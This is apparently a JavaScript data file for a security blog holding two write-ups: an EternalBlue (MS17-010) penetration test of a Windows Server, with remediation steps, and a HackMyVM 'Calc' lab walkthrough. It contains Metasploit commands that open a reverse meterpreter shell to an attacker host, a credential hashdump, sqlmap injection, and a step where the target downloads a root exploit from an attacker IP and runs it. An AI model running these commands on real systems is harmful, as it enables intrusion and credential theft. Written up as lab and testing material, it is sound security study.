const writeupsData = [
    
    
   {
    id: 'w8',
    title: 'Enterprise Pentest Sim: EternalBlue Full Chain (MS17-010)',
    date: '2026-08-17',
    category: 'Network Penetration Testing',
    difficulty: 'Medium',
    status: 'Published',
    body: `
    <h3>Scope & Context</h3>
    <p>Black-box penetration test against an enterprise network running real infrastructure — physical servers, IoT cameras, network equipment. Target: a Windows Server 2008 R2 machine hosting multiple business-critical services.</p>


    <h3>Host Discovery</h3>
    <pre><code>sudo arp-scan --localnet</code></pre>
    <p>4 live hosts identified. Vendor fingerprinting via MAC OUI:</p>
    <ul>
        <li><code>192.168.1.[REDACTED]</code> — Huawei (gateway)</li>
        <li><code>192.168.1.[REDACTED]</code> — Hewlett Packard (primary target)</li>
        <li><code>192.168.1.[REDACTED]</code> — VMware (isolated VM, all ports filtered)</li>
        <li><code>192.168.1.[REDACTED]</code> — TP-Link (WAP)</li>
    </ul>


    <h3>Port Scanning & Service Enumeration</h3>
    <pre><code>nmap -Pn -sV -sC -p- -T4 --min-rate 5000 [TARGET]</code></pre>
    <p>Key open ports on the HP server:</p>
    <ul>
        <li>23 — Telnet (Microsoft Windows XP telnetd)</li>
        <li>25/110/143 — Lotus Domino SMTP/POP3/IMAP 8.5.3FP6</li>
        <li>80 — Lotus Domino httpd</li>
        <li>389 — LDAP (<strong>Anonymous bind OK</strong>)</li>
        <li>445 — SMB (Windows Server 2008 R2 SP1, <strong>SMBv1 enabled, signing disabled</strong>)</li>
        <li>3306 — MySQL (unauthorized)</li>
        <li>3389 — RDP (NLA disabled)</li>
        <li>8001 — phpMyAdmin 4.9.7</li>
        <li>8080 — Laravel app (PHP 7.4.13, IIS 7.5)</li>
    </ul>
    <pre><code>smb-security-mode:
  account_used: guest
  message_signing: disabled (dangerous, but default)
SMBv1: True
Null Auth: True</code></pre>


    <h3>Vulnerability Detection — MS17-010</h3>
    <pre><code>nmap -Pn --script smb-vuln-ms17-010 -p445 [TARGET]</code></pre>
    <pre><code>Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|     Disclosure date: 2017-03-14</code></pre>

    <p>Confirmed via netexec — null session accepted, SMBv1 active:</p>
    <pre><code>netexec smb [TARGET] -u '' -p ''

SMB  [TARGET]  445  HRS2  [*] Windows Server 2008 R2 Standard 7601 SP1 x64
                           (signing:False) (SMBv1:True) (Null Auth:True)
SMB  [TARGET]  445  HRS2  [+] HRS2.[REDACTED]\:</code></pre>


    <h3>Exploitation — EternalBlue via Metasploit</h3>
    <pre><code>msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [TARGET]
set LHOST [ATTACKER]
set LPORT 4444
set payload windows/x64/meterpreter/reverse_tcp
run</code></pre>
    <pre><code>[*] Started reverse TCP handler on [ATTACKER]:4444
[+] [TARGET]:445 - Host is likely VULNERABLE to MS17-010!
[+] [TARGET]:445 - Connection established for exploitation.
[*] [TARGET]:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] [TARGET]:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard

[+] =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

[*] Meterpreter session 1 opened ([ATTACKER]:4444 -> [TARGET]:49166)</code></pre>


    <h3>Post-Exploitation</h3>
    <pre><code>meterpreter > getuid
Server username: NT AUTHORITY\\SYSTEM

meterpreter > sysinfo
Computer        : HRS2
OS              : Windows Server 2008 R2 (6.1 Build 7601, Service Pack 1)
Architecture    : x64
System Language : fr_FR
Meterpreter     : x64/windows</code></pre>


    <h3>Credential Dumping</h3>
    <pre><code>meterpreter > hashdump

[REDACTED]:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
[REDACTED]:501:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
[REDACTED]:1004:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
[REDACTED]:1000:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::</code></pre>


    <h3>Hidden Internal Network Discovery</h3>
    <p>The server had a second NIC connected to an internal network completely invisible from outside:</p>
    <pre><code>meterpreter > ipconfig

Ethernet adapter local:
   IP Address  : 110.100.100.[REDACTED]   ← internal network

Ethernet adapter WAN:
   IP Address  : 192.168.1.[REDACTED]     ← external network</code></pre>

    <pre><code>meterpreter > arp

110.100.100.[REDACTED]  00-0c-29-[REDACTED]   ← VMware VM (previously unreachable)
110.100.100.[REDACTED]  [REDACTED]
110.100.100.[REDACTED]  [REDACTED]
... [15 additional internal hosts]</code></pre>


    <h3>Sensitive File Discovery</h3>
    <pre><code>meterpreter > search -f *.pdf -d C:\\
Found 178 results

meterpreter > search -f *password* -d C:\\
Found 7 results</code></pre>


    <h3>Configuration File — Credentials in Plaintext</h3>
    <p>The Laravel application's <code>.env</code> file was found at <code>C:\\inetpub\\wwwroot\\[REDACTED]\\.env</code> and contained database credentials in cleartext:</p>
    <pre><code>DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=[REDACTED]
DB_USERNAME=root
DB_PASSWORD=[REDACTED]

DB_CONNECTION_2=ventef
DB_HOST_2=[REDACTED]
DB_PORT_2=1521
DB_DATABASE_2=xe
DB_USERNAME_2=SYSTEM
DB_PASSWORD_2=[REDACTED]

APP_KEY=base64:[REDACTED]
APP_DEBUG=true</code></pre>


    <h3>Remediation Applied</h3>

    <h4>1. Disable SMBv1 via registry</h4>
    <pre><code>reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters" /v SMB1 /t REG_DWORD /d 0 /f</code></pre>


    <h4>2. Block ports 445 and 139 at host firewall</h4>
    <pre><code>netsh advfirewall firewall add rule name="Block_SMBv1" protocol=TCP dir=in localport=445 action=block
netsh advfirewall firewall add rule name="Block_NetBIOS" protocol=TCP dir=in localport=139 action=block</code></pre>


    <h4>3. Verification — vulnerability no longer exploitable</h4>
    <pre><code>nmap -Pn --script smb-vuln-ms17-010 -p445 [TARGET]

PORT    STATE SERVICE
445/tcp open  microsoft-ds
# No vulnerability block returned — firewall rule blocking probe</code></pre>


    <h4>4. LDAP anonymous bind blocked</h4>
    <pre><code>netsh advfirewall firewall add rule name="Block_LDAP_Anonymous" protocol=TCP dir=in localport=389 action=block</code></pre>
    <p>Pre-fix: a single unauthenticated ldapsearch returned 150+ real employee accounts (names, emails, usernames, org structure). Post-fix: connection refused.</p>




    <p>Happy Hacking :)</p>
    `
},
    
    
    
    
    
    
        {
        id: 'w7',
        title: 'HackMyVM: Calc',
        date: '2026-MM-DD', // ← use your actual date, e.g. '2026-08-02'
        category: 'Web Exploitation',
        difficulty: 'Medium',
        status: 'Published',
        body: `
        <h3>Mapping hostname</h3>
        <pre><code>echo "&lt;target-IP&gt; calc.vm" | sudo tee -a /etc/hosts > /dev/null</code></pre>
        <h3>Enumeration</h3>
        <pre><code>nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn calc.vm</code></pre>
        <p>Open ports:</p>
        <ul>
        <li>22 — SSH</li>
        <li>80 — HTTP (Apache, reverse proxy)</li>
        <li>8080 — HTTP (Tomcat / Spring Boot webapp)</li>
        </ul>
        <p>Port 80 hosts a web application that takes a number input and returns a music track. Intercepting requests in Burp Suite reveals the endpoint:</p>
        <pre><code>GET /api/track/1</code></pre>
        
        <h3>Initial Foothold</h3>
        
        <pre><code>sqlmap -u "http://calc.vm:80/api/track/1*" --batch</code></pre>
        <p>The endpoint is vulnerable to error-based and blind SQL injection (MariaDB).</p>
        <pre><code>sqlmap -u "http://calc.vm:80/api/track/1*" -D calc_db --dump --batch</code></pre>
        <p>Credentials from webapp_users:</p>
        <pre><code>+----+----------------------+----------+
| id | password             | username |
+----+----------------------+----------+
| 1  | JimmyThumb_Calc_2010 | Jimmy    |
+----+----------------------+----------+</code></pre>
        <h3>SSH Access</h3>
        <pre><code>ssh Jimmy@&lt;target-ip&gt;
# Password: JimmyThumb_Calc_2010</code></pre>
        <p>User flag in ~/user.txt.</p>
        <h3>Privilege Escalation</h3>
        <h4>Enumeration as Jimmy</h4>
        <pre><code>id
sudo -l
find / -perm -4000 2>/dev/null
cat ~/TODO.txt</code></pre>
        <p>No sudo rights. TODO file leaks DB credentials, but copy-fail is quicker.</p>
        <h4>copy-fail exploit</h4>
        <p><strong>Attacker:</strong></p>
        <pre><code>git clone https://github.com/tgies/copy-fail-c.git
cd copy-fail-c
make
python3 -m http.server 8015</code></pre>
        <p><strong>Target:</strong></p>
        <pre><code>wget http://&lt;attacker-ip&gt;:8015/exploit
chmod +x exploit
./exploit</code></pre>
        <pre><code>whoami
# root
cat /root/root.txt</code></pre>
        <p>Happy Hacking :)</p>
        `
}

 
 ];
